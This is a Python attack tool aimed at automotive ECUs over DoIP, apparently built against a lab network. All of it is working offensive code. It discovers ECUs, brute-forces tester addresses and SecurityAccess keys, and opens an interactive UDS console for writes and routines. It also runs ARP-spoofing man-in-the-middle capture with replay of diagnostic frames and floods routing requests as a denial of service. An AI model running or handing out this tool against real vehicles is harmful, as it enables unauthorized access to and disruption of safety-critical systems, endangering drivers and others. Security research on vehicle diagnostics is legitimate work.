#!/usr/bin/env python3
"""
Unified DoIP Attacker with Replay & Spoofing

Flow:
- Discovery
- Logical Address Range Input
- Routing Brute Force
- Routing Activation
- MAIN MENU:
    1) Security Access Brute Force -> UDS Interactive Console
    2) Replay & Spoofing Attack (ARP MiTM)
    3) DoS Flooding
    0) Exit
"""

import socket
import struct
import time
import threading
import os
from scapy.all import sniff, IP, TCP, Raw, send, ARP, get_if_hwaddr

# ===================== CONFIG =====================
DOIP_PORT = 13400
BROADCAST = "10.0.0.255"
INTERFACE = "vethD"

# ===================== STATE =====================
STATE = {
    "ecu_ip": None,
    "ecu_logical": None,
    "ecu_vin": None,
    "tester_logical": None,
    "tcp": None,
    "uds_ready": False,
    "keepalive": False
}

# Replay attack state
REPLAY_STATE = {
    "captured_frames": [],
    "arp_running": False,
    "sniff_running": False,
    "forwarding_enabled": True,
    "replay_tcp": None
}

# ===================== COLORS =====================
R = "\033[0m"
G = "\033[32m"
Y = "\033[33m"
B = "\033[34m"
C = "\033[36m"
E = "\033[31m"

# ===================== DoIP HELPERS =====================
def doip(ptype, payload=b""):
    return struct.pack("!BBHI", 0x02, 0xFD, ptype, len(payload)) + payload

def info(m): print(f"{C}[INFO]{R} {m}")
def ok(m):   print(f"{G}[ OK ]{R} {m}")
def warn(m): print(f"{Y}[WARN]{R} {m}")
def err(m):  print(f"{E}[ERR ]{R} {m}")

# ===================== DISCOVERY =====================
def discovery():
    info("Sending Vehicle Identification Request")
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp.settimeout(3)
    udp.sendto(doip(0x0001), (BROADCAST, DOIP_PORT))

    try:
        data, addr = udp.recvfrom(4096)
    except socket.timeout:
        err("No ECU responded")
        return False

    payload = data[8:]
    STATE["ecu_vin"] = payload[:17].decode(errors="ignore")
    STATE["ecu_logical"] = struct.unpack("!H", payload[17:19])[0]
    STATE["ecu_ip"] = addr[0]

    ok("ECU FOUND")
    print(f" ECU IP      : {STATE['ecu_ip']}")
    print(f" ECU VIN     : {STATE['ecu_vin']}")
    print(f" ECU LOGICAL : 0x{STATE['ecu_logical']:04X}")
    return True

# ===================== RANGE INPUT =====================
def prompt_logical_range():
    print("\n=== Logical Address Range ===")
    start = int(input("Start Logical Address (hex): "), 16)
    end   = int(input("End Logical Address   (hex): "), 16)
    print(f"[CONFIG] Range 0x{start:04X} → 0x{end:04X}\n")
    return start, end

# ===================== ENUMERATION =====================
def enumerate_testers(start, end):
    info("Brute-forcing Tester Logical Addresses")
    for la in range(start, end + 1):
        try:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp.settimeout(1)
            tcp.connect((STATE["ecu_ip"], DOIP_PORT))
            payload = struct.pack("!HBBI", la, 0x10, 0x00, 0)
            tcp.send(doip(0x0005, payload))
            resp = tcp.recv(4096)

            ptype = struct.unpack("!H", resp[2:4])[0]
            print(f"this is ptype= {ptype}")
            payload = resp[8:]
            print(f"this is payload= {payload}")
            if ptype == 0x0006:
                print("test im here")
                src, dst, rc, reserved, oem = struct.unpack("!HHBBI", payload)
                print(f"Routing response → src=0x{src:04X}, dst=0x{dst:04X}, rc=0x{rc:02X}")
                if rc == 0x10:
                    print("test im here 2")
                    ok(f"VALID TESTER FOUND: 0x{la:04X}")
                    STATE["tester_logical"] = la
                    tcp.close()
                    return True
            tcp.close()
            time.sleep(0.1)
        except:
            continue
    err("No valid tester logical found")
    return False

# ===================== ROUTING =====================
def routing_activation():
    info("Opening Routing Activation")
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect((STATE["ecu_ip"], DOIP_PORT))
    payload = struct.pack("!HBBI", STATE["tester_logical"], 0x10, 0x00, 0)
    tcp.send(doip(0x0005, payload))
    resp = tcp.recv(4096)

    ptype = struct.unpack("!H", resp[2:4])[0]
    payload = resp[8:]
    if ptype == 0x0006:
        src, dst, rc, reserved, oem = struct.unpack("!HHBBI", payload)
        if rc == 0x10:
            ok("Routing Activated – UDS Access Granted")
            STATE["tcp"] = tcp
            STATE["uds_ready"] = True
            return True
    err("Routing activation failed")
    return False

# ===================== UDS over DoIP =====================
def uds_doip_send_recv(payload, timeout=1.0):
    frame = struct.pack("!HH", STATE["tester_logical"], STATE["ecu_logical"]) + payload
    STATE["tcp"].send(doip(0x8001, frame))
    STATE["tcp"].settimeout(timeout)
    try:
        resp = STATE["tcp"].recv(4096)
    except socket.timeout:
        return None
    return resp[12:]

# ===================== TESTER PRESENT THREAD =====================
def tester_present_loop():
    while True:
        if STATE["keepalive"]:
            uds_doip_send_recv(b"\x3E\x00")
            time.sleep(2)
        else:
            time.sleep(0.2)

# ===================== ATTACK 1: SECURITY ACCESS =====================
def attack_security_access_bruteforce():
    info("[ATTACK] Security Access Brute Force")
    seed_resp = uds_doip_send_recv(b"\x27\x01")
    if not seed_resp or seed_resp[0] != 0x67:
        err("Seed request failed")
        return False

    for key in range(0x11222000, 0x122222FF):
        resp = uds_doip_send_recv(b"\x27\x02" + key.to_bytes(4, "big"))
        if resp and resp[:2] == b"\x67\x02":
            ok(f"SECURITY UNLOCKED! KEY=0x{key:08X}")
            return True
    warn("Bruteforce failed")
    return False

# ===================== UDS INTERACTIVE =====================
def uds_interactive():
    print(f"""
{C}===== UDS INTERACTIVE ====={R}
10 01 / 10 02 / 10 03
22 F190 / F18C / F1A0
2E F1A0 <DATA>
31 01|02|03 1234|5678
s  -> Start TesterPresent
f  -> Stop TesterPresent
st -> Show Status
c  -> Show Commands
b  -> Back
{C}==========================={R}
""")
    while True:
        cmd = input(f"{B}UDS>{R} ").strip().lower()
        if cmd == "b":
            break
        if cmd == "s":
            STATE["keepalive"] = True; ok("TesterPresent ON"); continue
        if cmd == "f":
            STATE["keepalive"] = False; ok("TesterPresent OFF"); continue
        if cmd == "st":
            print(f"\n{C}=== STATE ==={R}")
            for k, v in STATE.items():
                if k != "tcp":
                    print(f"{k}: {v}")
            continue
        if cmd == "c":
            print("10,22,2E,31 | s,f,st,c,b"); continue

        try:
            data = bytes.fromhex(cmd)
            resp = uds_doip_send_recv(data)
            if resp:
                if resp[0] == 0x7F:
                    err(f"NRC: {resp.hex()}")
                else:
                    ok(f"RX: {resp.hex()}")
            else:
                warn("NO RESPONSE")
        except:
            warn("Invalid command")

# ===================== ATTACK 2: REPLAY & SPOOFING =====================

def get_service_name(sid):
    """Get UDS service name"""
    services = {
        0x10: "DiagnosticSessionControl",
        0x11: "ECUReset",
        0x22: "ReadDataByIdentifier",
        0x27: "SecurityAccess",
        0x2E: "WriteDataByIdentifier",
        0x31: "RoutineControl",
        0x3E: "TesterPresent"
    }
    return services.get(sid, f"Unknown(0x{sid:02X})")

def parse_doip_uds(raw_data):
    """Extract UDS payload from DoIP packet"""
    try:
        if len(raw_data) < 8:
            return None
        
        payload_type = struct.unpack("!H", raw_data[2:4])[0]
        payload_len = struct.unpack("!I", raw_data[4:8])[0]
        
        if payload_type != 0x8001:
            return None
        
        payload = raw_data[8:8+payload_len]
        
        if len(payload) < 4:
            return None
            
        src_addr = struct.unpack("!H", payload[0:2])[0]
        dst_addr = struct.unpack("!H", payload[2:4])[0]
        uds_data = payload[4:]
        
        return {
            'src': src_addr,
            'dst': dst_addr,
            'uds': uds_data,
            'raw': raw_data
        }
    except:
        return None

def arp_spoof():
    """Send ARP replies to poison both ECU and Tester"""
    
    try:
        # Suppress scapy verbose output
        import logging
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        
        attacker_mac = get_if_hwaddr(INTERFACE)
        tester_ip = "10.0.0.20"
        
        # Tell ECU that we are the Tester
        arp_ecu = ARP(op=2, pdst=STATE["ecu_ip"], hwdst="ff:ff:ff:ff:ff:ff", 
                      psrc=tester_ip, hwsrc=attacker_mac)
        
        # Tell Tester that we are the ECU
        arp_tester = ARP(op=2, pdst=tester_ip, hwdst="ff:ff:ff:ff:ff:ff",
                         psrc=STATE["ecu_ip"], hwsrc=attacker_mac)
        
        while REPLAY_STATE["arp_running"]:
            send(arp_ecu, iface=INTERFACE, verbose=False)
            send(arp_tester, iface=INTERFACE, verbose=False)
            time.sleep(2)
    except Exception as e:
        err(f"ARP spoofing error: {e}")

def forward_packet(packet):
    """Forward packet to maintain connectivity"""
    try:
        if packet.haslayer(IP):
            send(packet, iface=INTERFACE, verbose=False)
    except:
        pass

def packet_handler(packet):
    """Sniff, capture, and forward DoIP packets"""
    
    # Forward packet first to maintain connection
    if REPLAY_STATE["forwarding_enabled"]:
        forward_packet(packet)
    
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == DOIP_PORT or packet[TCP].sport == DOIP_PORT:
            raw_data = bytes(packet[Raw].load)
            
            doip_msg = parse_doip_uds(raw_data)
            if doip_msg and doip_msg['uds']:
                
                # Only capture tester -> ECU messages
                if packet[IP].src == "10.0.0.20" and packet[IP].dst == STATE["ecu_ip"]:
                    timestamp = time.strftime("%H:%M:%S")
                    sid = doip_msg['uds'][0]
                    
                    # Skip TesterPresent
                    if sid == 0x3E:
                        return
                    
                    service_name = get_service_name(sid)
                    # Print on new line to avoid interfering with input
                    print(f"\n{C}[INFO]{R} [{timestamp}] 📡 CAPTURED: {service_name} | {doip_msg['uds'].hex()}")
                    print(f"{E}Replay>{R} ", end='', flush=True)
                    
                    REPLAY_STATE["captured_frames"].append({
                        'timestamp': timestamp,
                        'uds': doip_msg['uds'],
                        'raw': doip_msg['raw'],
                        'service': service_name,
                        'src': doip_msg['src'],
                        'dst': doip_msg['dst']
                    })

def start_sniffing():
    """Start packet capture"""
    # Suppress scapy warnings
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    
    sniff(iface=INTERFACE, prn=packet_handler, store=False, stop_filter=lambda x: not REPLAY_STATE["sniff_running"])

def replay_connect_to_ecu():
    """Establish separate connection for replay"""
    try:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp.connect((STATE["ecu_ip"], DOIP_PORT))
        
        info("Sending routing activation for replay...")
        payload = struct.pack("!HBBI", STATE["tester_logical"], 0x10, 0x00, 0)
        tcp.send(doip(0x0005, payload))
        
        resp = tcp.recv(4096)
        ptype = struct.unpack("!H", resp[2:4])[0]
        
        if ptype == 0x0006:
            payload = resp[8:]
            src, dst, rc, reserved, oem = struct.unpack("!HHBBI", payload)
            if rc == 0x10:
                ok("Replay connection established")
                REPLAY_STATE["replay_tcp"] = tcp
                return True
        
        err("Replay routing activation failed")
        return False
    except Exception as e:
        err(f"Replay connection failed: {e}")
        return False

def replay_frame(frame_idx):
    """Replay a captured frame"""
    if frame_idx < 0 or frame_idx >= len(REPLAY_STATE["captured_frames"]):
        err("Invalid frame index")
        return
    
    if not REPLAY_STATE["replay_tcp"]:
        err("Not connected. Use 'connect' first")
        return
    
    frame = REPLAY_STATE["captured_frames"][frame_idx]
    
    try:
        # Build DoIP diagnostic message
        uds_payload = struct.pack("!HH", STATE["tester_logical"], STATE["ecu_logical"]) + frame['uds']
        doip_msg = doip(0x8001, uds_payload)
        
        print(f"\n{Y}{'='*50}{R}")
        info(f"🔄 Replaying: {frame['service']}")
        info(f"📤 UDS Data: {frame['uds'].hex()}")
        info(f"⏰ Original Time: {frame['timestamp']}")
        print(f"{Y}{'='*50}{R}")
        
        REPLAY_STATE["replay_tcp"].send(doip_msg)
        
        # Receive response
        REPLAY_STATE["replay_tcp"].settimeout(2.0)
        resp = REPLAY_STATE["replay_tcp"].recv(4096)
        
        if len(resp) > 12:
            uds_resp = resp[12:]
            
            # Parse response
            if uds_resp[0] == 0x7F:
                nrc = uds_resp[2]
                nrc_names = {
                    0x33: "Security Access Denied",
                    0x7E: "Wrong Session",
                    0x22: "Conditions Not Correct",
                    0x35: "Invalid Key",
                    0x24: "Request Sequence Error"
                }
                err(f"❌ NRC: 0x{nrc:02X} - {nrc_names.get(nrc, 'Unknown')}")
            else:
                ok(f"✅ Success! Response: {uds_resp.hex()}")
        else:
            warn("No response received")
            
    except socket.timeout:
        warn("⏱️ Timeout - no response")
    except Exception as e:
        err(f"Replay failed: {e}")

def show_captured():
    """Display captured frames"""
    if not REPLAY_STATE["captured_frames"]:
        warn("No frames captured yet")
        return
    
    print(f"\n{C}{'='*70}{R}")
    print(f"{C}CAPTURED FRAMES{R}")
    print(f"{C}{'='*70}{R}")
    for i, frame in enumerate(REPLAY_STATE["captured_frames"]):
        print(f"{B}{i:3d}{R} | [{frame['timestamp']}] {frame['service']:30s} | {frame['uds'].hex()}")
    print(f"{C}{'='*70}{R}\n")

def attack_replay_spoofing():
    """Main replay attack interface"""
    
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
    ok("IP forwarding enabled")
    
    # Start ARP spoofing
    REPLAY_STATE["arp_running"] = True
    arp_thread = threading.Thread(target=arp_spoof, daemon=True)
    arp_thread.start()
    time.sleep(1)
    
    # Start packet capture
    REPLAY_STATE["sniff_running"] = True
    sniff_thread = threading.Thread(target=start_sniffing, daemon=True)
    sniff_thread.start()
    time.sleep(1)
    
    ok("ARP MiTM Active - Packet capture started")
    
    print(f"""
{C}========================================
   REPLAY & SPOOFING ATTACK
========================================{R}

Commands:
  show              - Show captured frames
  replay <index>    - Replay frame by index
  multi <i,j,k>     - Replay multiple frames
  connect           - Connect to ECU for replay
  clear             - Clear captured frames
  stop              - Stop ARP spoofing & return
  help              - Show this help

{G}📡 Listening for traffic... Commands will be captured automatically{R}
""")
    
    while True:
        try:
            cmd = input(f"{E}Replay>{R} ").strip().lower()
            
            if cmd == "stop":
                REPLAY_STATE["arp_running"] = False
                REPLAY_STATE["sniff_running"] = False
                ok("Stopped ARP spoofing")
                break
            elif cmd == "show":
                show_captured()
            elif cmd.startswith("replay "):
                try:
                    idx = int(cmd.split()[1])
                    replay_frame(idx)
                except:
                    err("Usage: replay <index>")
            elif cmd.startswith("multi "):
                try:
                    indices = [int(x) for x in cmd.split()[1].split(',')]
                    for idx in indices:
                        replay_frame(idx)
                        time.sleep(0.5)
                except:
                    err("Usage: multi <i,j,k>")
            elif cmd == "connect":
                replay_connect_to_ecu()
            elif cmd == "clear":
                REPLAY_STATE["captured_frames"].clear()
                ok("Captured frames cleared")
            elif cmd == "help":
                print("show | replay <N> | multi <N,M> | connect | clear | stop")
            elif cmd == "":
                continue
            else:
                warn("Unknown command. Type 'help' for usage")
                
        except KeyboardInterrupt:
            REPLAY_STATE["arp_running"] = False
            REPLAY_STATE["sniff_running"] = False
            break

# ===================== ATTACK 3: DoS FLOODING =====================
def attack_dos_flooding():
    info("[ATTACK] DoS Flooding")
    count = int(input("Number of packets to send (default 1000): ") or "1000")
    
    ok(f"Sending {count} DoIP routing requests...")
    success = 0
    for i in range(count):
        try:
            STATE["tcp"].send(doip(0x0005, b"\x00"*8))
            success += 1
            if (i+1) % 100 == 0:
                print(f"Sent {i+1}/{count}...", end='\r')
        except:
            break
    
    ok(f"Flood complete: {success}/{count} packets sent")

# ===================== MAIN MENU =====================
def main_menu():
    while True:
        print(f"""
{C}============= MAIN MENU ============={R}
1) Security Access -> UDS Interactive
2) Replay & Spoofing (ARP MiTM)
3) DoS Flooding
0) Exit
{C}====================================={R}
""")
        c = input(f"{B}>{R} ").strip()
        if c == "1":
            if attack_security_access_bruteforce():
                uds_interactive()
        elif c == "2":
            attack_replay_spoofing()
        elif c == "3":
            attack_dos_flooding()
        elif c == "0":
            ok("Exiting...")
            break

# ===================== MAIN =====================
if __name__ == "__main__":
    # Check root
    if os.geteuid() != 0:
        err("This script must be run as root (for ARP spoofing)")
        exit(1)
    
    print(f"{C}=== UNIFIED DoIP ATTACKER ==={R}")
    if not discovery(): 
        exit(1)
    start, end = prompt_logical_range()
    if not enumerate_testers(start, end): 
        exit(1)
    if not routing_activation(): 
        exit(1)
    threading.Thread(target=tester_present_loop, daemon=True).start()
    main_menu()